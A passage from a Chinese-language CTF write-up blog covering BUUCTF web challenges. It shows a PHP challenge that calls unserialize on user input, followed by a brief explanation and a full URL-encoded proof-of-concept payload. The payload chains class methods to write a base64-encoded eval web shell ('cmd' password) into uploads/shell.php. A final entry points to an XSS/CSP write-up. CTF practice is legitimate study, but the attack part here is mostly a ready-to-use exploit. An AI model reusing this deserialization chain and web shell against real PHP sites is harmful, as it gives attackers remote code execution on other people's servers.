class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span><span class="params">(<span class="number">0</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">($store, $key = <span class="string">&#x27;flysystem&#x27;</span>, $expire = <span class="literal">null</span>)</span> &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;key = $key;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;store = $store;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">cleanContents</span><span class="params">(array $contents)</span> &#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        foreach ($contents <span class="type">as</span> <span class="variable">$path</span> <span class="operator">=</span>&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">getForStorage</span><span class="params">()</span> &#123;</span><br><span class="line">        $cleaned = $<span class="built_in">this</span>-&gt;cleanContents($<span class="built_in">this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, $<span class="built_in">this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">save</span><span class="params">()</span> &#123;</span><br><span class="line">        $contents = $<span class="built_in">this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        $<span class="built_in">this</span>-&gt;store-&gt;set($<span class="built_in">this</span>-&gt;key, $contents, $<span class="built_in">this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__destruct</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$<span class="built_in">this</span>-&gt;autosave) &#123;</span><br><span class="line">            $<span class="built_in">this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> function <span class="title function_">getExpireTime</span><span class="params">($expire)</span>: <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">getCacheKey</span><span class="params">(string $name)</span>: string &#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> function <span class="title function_">serialize</span><span class="params">($data)</span>: string &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = $<span class="built_in">this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">set</span><span class="params">($name, $value, $expire = <span class="literal">null</span>)</span>: bool&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = $<span class="built_in">this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = $<span class="built_in">this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = $<span class="built_in">this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\Exception $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = $<span class="built_in">this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="built_in">this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>入口在<code>save()</code>中的set，可以调用到B类的set方法，之后就是死亡函数绕过了，他太能套了，导致我没有写wp的欲望，byd<br>POC：<code>O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A10%3A%22writeTimes%22%3Bi%3A0%3Bs%3A7%3A%22options%22%3Ba%3A3%3A%7Bs%3A13%3A%22data_compress%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A67%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Duploads%2Fshell.php%22%3Bs%3A9%3A%22serialize%22%3Bs%3A6%3A%22strval%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A0%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A43%3A%22aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4%3D%22%3B%7D</code><br><code>/upload/shell.php</code><br>密码cmd</p>
<h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>考点：XSS CSP<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rabbittt/p/13385787.html">https://www.cnblogs.com/rabbittt/p/13385787.html</a></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/BUUCTF/" class="tag">#BUUCTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/08/BUUCTF3/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">BUUCTF Web Writeup 3</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/04/08/BUUCTF1-2/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">BUUCTF Web Writeup 1-2</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>